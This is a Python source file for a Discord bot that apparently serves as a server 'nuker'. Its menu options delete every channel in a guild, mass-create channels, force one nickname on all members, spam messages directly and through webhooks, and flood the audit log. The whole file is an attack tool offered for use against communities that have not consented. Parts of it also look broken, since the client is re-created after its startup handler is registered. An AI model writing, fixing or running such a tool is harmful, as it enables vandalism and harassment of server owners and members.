import os
import discord
from colorama import Fore, Style, init
import json
import asyncio
import time
import ctypes
from discord.errors import Forbidden
import traceback
# Initialize Colorama
init(autoreset=True)

def set_console_title(title):
    ctypes.windll.kernel32.SetConsoleTitleW(title)

def start_bot():
    bot.run(load_bot_token())

intents = discord.Intents.default()
intents.typing = False
intents.presences = False

bot = discord.Client(intents=intents, heartbeat_timeout=99999)  # so the bot runs into no stupid ass errors


# title
set_console_title("Made By daddy_m")

@bot.event
async def on_ready():
    print(f'{Fore.MAGENTA}{Style.BRIGHT}Logged in as {bot.user.name}{Style.RESET_ALL}')

    # Set the bot's status to "idle" with a custom status message
    await bot.change_presence(status=discord.Status.idle, activity=discord.Game("github.com/Jakee8718"))
# github.com/Jakee8718

    await main_menu()



async def main_menu():
    while True:
        clear_terminal()  # Clear the terminal
        print(f"{Fore.MAGENTA}{Style.BRIGHT}╔═══════════════════════════════════╦═════════╦═══════════════════════════════════╗")
        print(f"{Fore.MAGENTA}{Style.BRIGHT}╠═══════════════════════════════════╣{Fore.MAGENTA}{Style.BRIGHT} Options {Style.RESET_ALL}{Fore.MAGENTA}{Style.BRIGHT}╠═══════════════════════════════════╣")
        print(f"{Fore.MAGENTA}{Style.BRIGHT}║  Logged in as {Fore.BLUE} {bot.user.name} {Style.RESET_ALL}{Fore.MAGENTA}{Style.BRIGHT}    ╚═════════╝                                   ║")
        print(f"{Fore.MAGENTA}{Style.BRIGHT}╠╡ (1) ╞═› {Fore.BLUE}{Style.BRIGHT} Nuke Channels {Style.RESET_ALL}   {Fore.MAGENTA}{Style.BRIGHT}     (3) ╞═› {Fore.BLUE}{Style.BRIGHT} Spam Channels  {Style.RESET_ALL}          {Fore.MAGENTA}{Style.BRIGHT}              ║")
        print(f"{Fore.MAGENTA}{Style.BRIGHT}╠╡ (2) ╞═› {Fore.BLUE}{Style.BRIGHT} Raid Server {Style.RESET_ALL}   {Fore.MAGENTA}{Style.BRIGHT}       (4) ╞═› {Fore.BLUE}{Style.BRIGHT} Spam With Webhook  {Style.RESET_ALL}          {Fore.MAGENTA}{Style.BRIGHT}          ║")
        print(f"{Fore.MAGENTA}{Style.BRIGHT}╠╡ (5) ╞═› {Fore.BLUE}{Style.BRIGHT} Audit Log Spam {Style.RESET_ALL}   {Fore.MAGENTA}{Style.BRIGHT}    (6) ╞═› {Fore.BLUE}{Style.BRIGHT} COMING SOON {Style.RESET_ALL}      {Fore.MAGENTA}{Style.BRIGHT}                     ║")
        print(f"{Fore.MAGENTA}{Style.BRIGHT}{Fore.MAGENTA}{Style.BRIGHT}║ Last Updated: 3/23/2024                                                         ║")
        print(f"{Fore.MAGENTA}{Style.BRIGHT}║ Discord: https://discord.gg/qybBqmkcnE                                          ║")
        print(f"{Fore.MAGENTA}{Style.BRIGHT}╚═════════════════════════════════════════════════════════════════════════════════╝")
        
        option = input("Input:  ")

        if option == "1":
            guild_id = input("Enter the GUILD ID: ")
            await nuke(guild_id)
        elif option == "2":
            guild_id = input("Enter the GUILD ID: ")
            channel_name = input("Enter the Channel Name: ")
            num_channels = int(input("Enter the number of channels to create: "))
            nickname = input("Enter the Nickname for all members: ")
            await raid(guild_id, channel_name, num_channels, nickname)
        elif option == "3":
            guild_id = input("Enter the GUILD ID: ")
            channel_option = input("Enter the channel ID or 'all' to spam in all channels: ")
            
            if channel_option.lower() == "all":
                channel_ids = [ch.id for ch in bot.get_guild(int(guild_id)).channels]
            else:
                channel_ids = [int(channel_option)]
            
            message = input("Enter the message to spam: ")
            num_spams = int(input("Enter the number of times to spam the message in each channel: "))
            
            await spam_channels(channel_ids, message, num_spams)
        elif option == "4":
            await spam_with_webhook()
        elif option == "5":
            guild_id = input("Enter the GUILD ID: ")
            await audit_log_spam(guild_id)
        else:
            print("Invalid option. Please choose a valid option.") 



# option 1
async def nuke(guild_id):
    guild = bot.get_guild(int(guild_id))
    
    if guild is None:
        print("Guild not found.")
        return
    
    for channel in guild.channels:
        if isinstance(channel, (discord.TextChannel, discord.VoiceChannel)):
            await delete_channel(channel)
            print(f'{Fore.GREEN}{Style.BRIGHT}Channel "{channel.name}" deleted successfully.{Style.RESET_ALL}')


# option 2
async def raid(guild_id, channel_name, num_channels, nickname):
    guild = bot.get_guild(int(guild_id))
    
    if guild is None:
        print("Guild not found.")
        return
    
    for i in range(num_channels):
        try:
            new_channel = await guild.create_text_channel(channel_name)
            print(f'{Fore.GREEN}{Style.BRIGHT}Channel "{new_channel.name}" created successfully.{Style.RESET_ALL}')
        except Exception as e:
            print(f'{Fore.RED}{Style.BRIGHT}Failed to create channel: {e}{Style.RESET_ALL}')

    for member in guild.members:
        try:
            await member.edit(nick=nickname)
            print(f'{Fore.GREEN}{Style.BRIGHT}Nickname of "{member.name}" changed to "{nickname}" successfully.{Style.RESET_ALL}')
        except Exception as e:
            print(f'{Fore.RED}{Style.BRIGHT}Failed to change nickname for "{member.name}": {e}{Style.RESET_ALL}')


# option 1
async def delete_channel(channel):
    try:
        await channel.delete()
        print(f'{Fore.GREEN}{Style.BRIGHT}Channel "{channel.name}" deleted successfully.{Style.RESET_ALL}')
    except Exception as e:
        print(f'{Fore.RED}{Style.BRIGHT}Failed to delete channel "{channel.name}": {e}{Style.RESET_ALL}')


# option 3
async def spam_channels(channel_ids, message, num_spams):
    for channel_id in channel_ids:
        channel = bot.get_channel(channel_id)
        if channel is None:
            print(f"Channel with ID {channel_id} not found.")
            continue
        
        if isinstance(channel, discord.TextChannel):  # Check if it's a text channel
            for _ in range(num_spams):
                await channel.send(message)
                print(f'{Fore.GREEN}{Style.BRIGHT}Message "{message}" spammed in channel "{channel.name}".')
        else:
            print(f"Skipping {channel.name} because it's not a text channel.")


# option 4
async def spam_with_webhook():
    guild_id = input("Enter the GUILD ID: ")
    channel_option = input("Enter the channel ID or 'all' to spam in all text channels: ")

    if channel_option.lower() == "all":
        text_channels = [ch for ch in bot.get_guild(int(guild_id)).channels if isinstance(ch, discord.TextChannel)]
    else:
        text_channels = [bot.get_channel(int(channel_option))]

    message = input("Enter the message to spam: ")
    num_spams = int(input("Enter the number of times to spam the message with each webhook: "))

    for channel in text_channels:
        webhook = await channel.create_webhook(name="Spam Webhook")
        print(f'{Fore.GREEN}{Style.BRIGHT}Webhook created in channel "{channel.name}" for spamming.{Style.RESET_ALL}')

        for _ in range(num_spams):
            await webhook.send(content=message)
            print(f'{Fore.GREEN}{Style.BRIGHT}Message "{message}" spammed with webhook in channel "{channel.name}".{Style.RESET_ALL}')
            await asyncio.sleep(0.01)  # Pause to avoid rate limits (fast af)

        await webhook.delete()
        print(f'{Fore.GREEN}{Style.BRIGHT}Webhook deleted in channel "{channel.name}".{Style.RESET_ALL}')


# option 5
async def audit_log_spam(guild_id):
    guild = bot.get_guild(int(guild_id))
    
    if guild is None:
        print("Guild not found.")
        return
    # option 5 is still ass, it has some errors so you may have to re-run code sadly, fix may be soon
    try:
        # creates 15 text channels named "tlcket" 
        for i in range(1, 16):
            channel_name = f"tlcket {i:02}"
            await guild.create_text_channel(channel_name, reason="Audit Log Spam")
            print(f'{Fore.GREEN}{Style.BRIGHT}Channel "{channel_name}" created successfully.{Style.RESET_ALL}')
    except Exception as e:
        print(f"{Fore.RED}{Style.BRIGHT}An error occurred while creating channels: {e}{Style.RESET_ALL}")
    
    
    await asyncio.sleep(3) # hopefully avoid discord shitty ratelimit

    # Delete channels that start with "tlcket" (they use random numbers)
    try:
        for channel in guild.channels:
            if isinstance(channel, discord.TextChannel) and channel.name.startswith("tlcket"):
                await channel.delete()
                print(f'{Fore.GREEN}{Style.BRIGHT}Channel "{channel.name}" deleted successfully.{Style.RESET_ALL}')
    except Exception as e:
        print(f"{Fore.RED}{Style.BRIGHT}An error occurred while deleting channels: {e}{Style.RESET_ALL}")

    
    await main_menu()


bot = discord.Client(intents=intents, heartbeat_timeout=99999) 


def clear_terminal():
    os.system('cls' if os.name == 'nt' else 'clear')  # Clear the terminal based on OS

def start_bot():
    bot.run(load_bot_token())

def load_bot_token():
    with open("config.json", "r") as config_file:
        config = json.load(config_file)
    return config.get("bot_token")
    
if __name__ == "__main__":
    start_bot()
